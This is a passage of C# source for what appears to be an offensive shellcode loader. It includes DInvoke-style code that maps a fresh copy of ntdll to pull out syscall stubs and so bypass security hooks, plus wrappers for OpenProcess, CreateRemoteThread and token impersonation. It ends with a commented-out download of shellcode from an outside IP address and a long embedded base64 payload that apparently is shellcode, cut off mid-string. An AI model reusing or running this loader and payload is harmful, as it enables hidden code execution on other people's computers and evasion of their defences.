            /// Read ntdll from disk, find/copy the appropriate syscall stub and free ntdll.
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author>
            /// <param name="FunctionName">The name of the function to search for (e.g. "NtAlertResumeThread").</param>
            /// <returns>IntPtr, Syscall stub</returns>
            public static IntPtr GetSyscallStub(string FunctionName)
            {
                // Verify process & architecture
                bool isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
                if (IntPtr.Size == 4 && isWOW64)
                {
                    throw new InvalidOperationException("Generating Syscall stubs is not supported for WOW64.");
                }

                // Find the path for ntdll by looking at the currently loaded module
                string NtdllPath = string.Empty;
                ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
                foreach (ProcessModule Mod in ProcModules)
                {
                    if (Mod.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                    {
                        NtdllPath = Mod.FileName;
                    }
                }

                // Alloc module into memory for parsing
                IntPtr pModule = ManualMap.Map.AllocateFileToMemory(NtdllPath);

                // Fetch PE meta data
                Data.PE.PE_META_DATA PEINFO = GetPeMetaData(pModule);

                // Alloc PE image memory -> RW
                IntPtr BaseAddress = IntPtr.Zero;
                IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;

                IntPtr pImage = Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                    Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                    Data.Win32.WinNT.PAGE_READWRITE
                );

                // Write PE header to memory
                UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);

                // Write sections to memory
                foreach (Data.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
                {
                    // Calculate offsets
                    IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                    IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);

                    // Write data
                    BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                    if (BytesWritten != ish.SizeOfRawData)
                    {
                        throw new InvalidOperationException("Failed to write to memory.");
                    }
                }

                // Get Ptr to function
                IntPtr pFunc = GetExportAddress(pImage, FunctionName);
                if (pFunc == IntPtr.Zero)
                {
                    throw new InvalidOperationException("Failed to resolve ntdll export.");
                }

                // Alloc memory for call stub
                BaseAddress = IntPtr.Zero;
                RegionSize = (IntPtr)0x50;
                IntPtr pCallStub = Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                    Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                    Data.Win32.WinNT.PAGE_READWRITE
                );

                // Write call stub
                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pCallStub, pFunc, 0x50);
                if (BytesWritten != 0x50)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }

                // Change call stub permissions
                Native.NtProtectVirtualMemory((IntPtr)(-1), ref pCallStub, ref RegionSize, Data.Win32.WinNT.PAGE_EXECUTE_READ);

                // Free temporary allocations
                Marshal.FreeHGlobal(pModule);
                RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;

                Native.NtFreeVirtualMemory((IntPtr)(-1), ref pImage, ref RegionSize, Data.Win32.Kernel32.MEM_RELEASE);

                return pCallStub;
            }
        }

        public static class Win32
        {
            /// <summary>
            /// Uses DynamicInvocation to call the OpenProcess Win32 API. https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
            /// </summary>
            /// <author>The Wover (@TheRealWover)</author>
            /// <param name="dwDesiredAccess"></param>
            /// <param name="bInheritHandle"></param>
            /// <param name="dwProcessId"></param>
            /// <returns></returns>
            public static IntPtr OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId)
            {
                // Craft an array for the arguments
                object[] funcargs =
                {
                dwDesiredAccess, bInheritHandle, dwProcessId
            };

                return (IntPtr)Generic.DynamicAPIInvoke(@"kernel32.dll", @"OpenProcess",
                    typeof(Delegates.OpenProcess), ref funcargs);
            }

            public static IntPtr CreateRemoteThread(
                IntPtr hProcess,
                IntPtr lpThreadAttributes,
                uint dwStackSize,
                IntPtr lpStartAddress,
                IntPtr lpParameter,
                uint dwCreationFlags,
                ref IntPtr lpThreadId)
            {
                // Craft an array for the arguments
                object[] funcargs =
                {
                hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
            };

                IntPtr retValue = (IntPtr)Generic.DynamicAPIInvoke(@"kernel32.dll", @"CreateRemoteThread",
                    typeof(Delegates.CreateRemoteThread), ref funcargs);

                // Update the modified variables
                lpThreadId = (IntPtr)funcargs[6];

                return retValue;
            }

            /// <summary>
            /// Uses DynamicInvocation to call the IsWow64Process Win32 API. https://docs.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-iswow64process
            /// </summary>
            /// <returns>Returns true if process is WOW64, and false if not (64-bit, or 32-bit on a 32-bit machine).</returns>
            public static bool IsWow64Process(IntPtr hProcess, ref bool lpSystemInfo)
            {

                // Build the set of parameters to pass in to IsWow64Process
                object[] funcargs =
                {
                hProcess, lpSystemInfo
            };

                bool retVal = (bool)Generic.DynamicAPIInvoke(@"kernel32.dll", @"IsWow64Process", typeof(Delegates.IsWow64Process), ref funcargs);

                lpSystemInfo = (bool)funcargs[1];

                // Dynamically load and invoke the API call with out parameters
                return retVal;
            }

            /// <summary>
            /// Uses DynamicInvocation to call the CloseHandle Win32 API. https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            /// </summary>
            /// <returns></returns>
            public static bool CloseHandle(IntPtr handle)
            {

                // Build the set of parameters to pass in to CloseHandle
                object[] funcargs =
                {
                handle
            };

                bool retVal = (bool)Generic.DynamicAPIInvoke(@"kernel32.dll", @"CloseHandle", typeof(Delegates.CloseHandle), ref funcargs);

                // Dynamically load and invoke the API call with out parameters
                return retVal;
            }

            public static class Delegates
            {
                // Kernel32.dll

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr CreateRemoteThread(IntPtr hProcess,
                    IntPtr lpThreadAttributes,
                    uint dwStackSize,
                    IntPtr lpStartAddress,
                    IntPtr lpParameter,
                    uint dwCreationFlags,
                    out IntPtr lpThreadId);

                [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
                public delegate IntPtr OpenProcess(
                    Data.Win32.Kernel32.ProcessAccessFlags dwDesiredAccess,
                    bool bInheritHandle,
                    UInt32 dwProcessId
                );

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool IsWow64Process(
                    IntPtr hProcess, ref bool lpSystemInfo
                );

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean CloseHandle(IntPtr hProcess);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate IntPtr GetCurrentThread();

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate UInt32 SearchPath(String lpPath, String lpFileName, String lpExtension, UInt32 nBufferLength, StringBuilder lpBuffer, ref IntPtr lpFilePart);

                //Advapi32.dll

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean DuplicateTokenEx(IntPtr hExistingToken, UInt32 dwDesiredAccess, IntPtr lpTokenAttributes, _SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, _TOKEN_TYPE TokenType, out IntPtr phNewToken);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean ImpersonateLoggedOnUser(IntPtr hToken);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean OpenThreadToken(IntPtr ThreadHandle, UInt32 DesiredAccess, Boolean OpenAsSelf, ref IntPtr TokenHandle);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean ImpersonateSelf(_SECURITY_IMPERSONATION_LEVEL ImpersonationLevel);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean LookupPrivilegeValueA(String lpSystemName, String lpName, ref _LUID luid);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean AdjustTokenPrivileges(IntPtr TokenHandle, Boolean DisableAllPrivileges, ref _TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref _TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean LookupPrivilegeName(String lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref Int32 cchName);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean GetTokenInformation(IntPtr TokenHandle, _TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean PrivilegeCheck(IntPtr ClientToken, _PRIVILEGE_SET RequiredPrivileges, IntPtr pfResult);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool LookupAccountSidA(String lpSystemName, IntPtr Sid, StringBuilder lpName, ref UInt32 cchName, StringBuilder ReferencedDomainName, ref UInt32 cchReferencedDomainName, out _SID_NAME_USE peUse);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool ConvertSidToStringSidA(IntPtr Sid, ref IntPtr StringSid);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean LookupPrivilegeNameA(String lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref Int32 cchName);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, Byte[] lpApplicationName, Byte[] lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref _STARTUPINFO lpStartupInfo, out _PROCESS_INFORMATION lpProcessInformation);

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate Boolean CreateProcessWithLogonW(String lpUsername, String lpDomain, String lpPassword, LogonFlags dwLogonFlags, Byte[] lpApplicationName, Byte[] lpCommandLine, CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref _STARTUPINFO lpStartupInfo, out _PROCESS_INFORMATION lpProcessInformation);

                // Secur32.dll || sspicli.dll

                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
                public delegate UInt32 LsaGetLogonSessionData(IntPtr LogonId, out IntPtr ppLogonSessionData);
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _LUID
            {
                public System.UInt32 LowPart;
                public System.UInt32 HighPart;
            }

            //https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
            [StructLayout(LayoutKind.Sequential)]
            public struct _PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public UInt32 dwProcessId;
                public UInt32 dwThreadId;
            };

            [StructLayout(LayoutKind.Sequential)]
            public struct _STARTUPINFO
            {
                public UInt32 cb;
                public String lpReserved;
                public String lpDesktop;
                public String lpTitle;
                public UInt32 dwX;
                public UInt32 dwY;
                public UInt32 dwXSize;
                public UInt32 dwYSize;
                public UInt32 dwXCountChars;
                public UInt32 dwYCountChars;
                public UInt32 dwFillAttribute;
                public UInt32 dwFlags;
                public UInt16 wShowWindow;
                public UInt16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            };

            [Flags]
            public enum _TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }
            public enum LogonFlags
            {
                WithProfile = 1,
                NetCredentialsOnly = 0
            }
            public enum CreationFlags
            {
                DefaultErrorMode = 0x04000000,
                NewConsole = 0x00000010,
                CREATE_NO_WINDOW = 0x08000000,
                NewProcessGroup = 0x00000200,
                SeparateWOWVDM = 0x00000800,
                Suspended = 0x00000004,
                UnicodeEnvironment = 0x00000400,
                ExtendedStartupInfoPresent = 0x00080000
            }

            [Flags]
            public enum _SECURITY_IMPERSONATION_LEVEL : int
            {
                SecurityAnonymous = 0,
                SecurityIdentification = 1,
                SecurityImpersonation = 2,
                SecurityDelegation = 3
            };

            [Flags]
            public enum CREATION_FLAGS : uint
            {
                NONE = 0x0,
                CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                CREATE_NEW_CONSOLE = 0x00000010,
                CREATE_NEW_PROCESS_GROUP = 0x00000200,
                CREATE_SEPARATE_WOW_VDM = 0x00000800,
                CREATE_SUSPENDED = 0x00000004,
                CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                EXTENDED_STARTUPINFO_PRESENT = 0x00080000
            }

            [Flags]
            public enum _SID_NAME_USE
            {
                SidTypeUser = 1,
                SidTypeGroup,
                SidTypeDomain,
                SidTypeAlias,
                SidTypeWellKnownGroup,
                SidTypeDeletedAccount,
                SidTypeInvalid,
                SidTypeUnknown,
                SidTypeComputer,
                SidTypeLabel
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _TOKEN_PRIVILEGES
            {
                public UInt32 PrivilegeCount;
                public _LUID_AND_ATTRIBUTES Privileges;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _LUID_AND_ATTRIBUTES
            {
                public _LUID Luid;
                public System.UInt32 Attributes;
            }

            internal const Int32 ANYSIZE_ARRAY = 1;

            [StructLayout(LayoutKind.Sequential)]
            public struct _PRIVILEGE_SET
            {
                public System.UInt32 PrivilegeCount;
                public System.UInt32 Control;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = (Int32)ANYSIZE_ARRAY)]
                public _LUID_AND_ATTRIBUTES[] Privilege;
            }

            [Flags]
            public enum _TOKEN_INFORMATION_CLASS
            {
                TokenUser = 1,
                TokenGroups,
                TokenPrivileges,
                TokenOwner,
                TokenPrimaryGroup,
                TokenDefaultDacl,
                TokenSource,
                TokenType,
                TokenImpersonationLevel,
                TokenStatistics,
                TokenRestrictedSids,
                TokenSessionId,
                TokenGroupsAndPrivileges,
                TokenSessionReference,
                TokenSandBoxInert,
                TokenAuditPolicy,
                TokenOrigin,
                TokenElevationType,
                TokenLinkedToken,
                TokenElevation,
                TokenHasRestrictions,
                TokenAccessInformation,
                TokenVirtualizationAllowed,
                TokenVirtualizationEnabled,
                TokenIntegrityLevel,
                TokenUIAccess,
                TokenMandatoryPolicy,
                TokenLogonSid,
                TokenIsAppContainer,
                TokenCapabilities,
                TokenAppContainerSid,
                TokenAppContainerNumber,
                TokenUserClaimAttributes,
                TokenDeviceClaimAttributes,
                TokenRestrictedUserClaimAttributes,
                TokenRestrictedDeviceClaimAttributes,
                TokenDeviceGroups,
                TokenRestrictedDeviceGroups,
                TokenSecurityAttributes,
                TokenIsRestricted,
                MaxTokenInfoClass
            }
        }
    }
    public class WinNT
    {
        public const UInt32 PAGE_NOACCESS = 0x01;
        public const UInt32 PAGE_READONLY = 0x02;
        public const UInt32 PAGE_READWRITE = 0x04;
        public const UInt32 PAGE_WRITECOPY = 0x08;
        public const UInt32 PAGE_EXECUTE = 0x10;
        public const UInt32 PAGE_EXECUTE_READ = 0x20;
        public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
        public const UInt32 PAGE_GUARD = 0x100;
        public const UInt32 PAGE_NOCACHE = 0x200;
        public const UInt32 PAGE_WRITECOMBINE = 0x400;
        public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
        public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;

        public const UInt32 SEC_COMMIT = 0x08000000;
        public const UInt32 SEC_IMAGE = 0x1000000;
        public const UInt32 SEC_IMAGE_NO_EXECUTE = 0x11000000;
        public const UInt32 SEC_LARGE_PAGES = 0x80000000;
        public const UInt32 SEC_NOCACHE = 0x10000000;
        public const UInt32 SEC_RESERVE = 0x4000000;
        public const UInt32 SEC_WRITECOMBINE = 0x40000000;

        public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;
        public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
        public const UInt32 SE_PRIVILEGE_REMOVED = 0x4;
        public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;

        public const UInt64 SE_GROUP_ENABLED = 0x00000004L;
        public const UInt64 SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002L;
        public const UInt64 SE_GROUP_INTEGRITY = 0x00000020L;
        public const UInt32 SE_GROUP_INTEGRITY_32 = 0x00000020;
        public const UInt64 SE_GROUP_INTEGRITY_ENABLED = 0x00000040L;
        public const UInt64 SE_GROUP_LOGON_ID = 0xC0000000L;
        public const UInt64 SE_GROUP_MANDATORY = 0x00000001L;
        public const UInt64 SE_GROUP_OWNER = 0x00000008L;
        public const UInt64 SE_GROUP_RESOURCE = 0x20000000L;
        public const UInt64 SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010L;
    }

    class Program
    {
	public static void Main(string[] args){
	}
	
        public static void run(string[] args)
        {
        
            //string URI = "http://192.168.161.155/adsense/troubleshooter/1631343/Sharp_v4_x64_Shellcode.b64";
            //byte[] buf = Convert.FromBase64String((new WebClient()).DownloadString(URI));
	
			string b64Buf = "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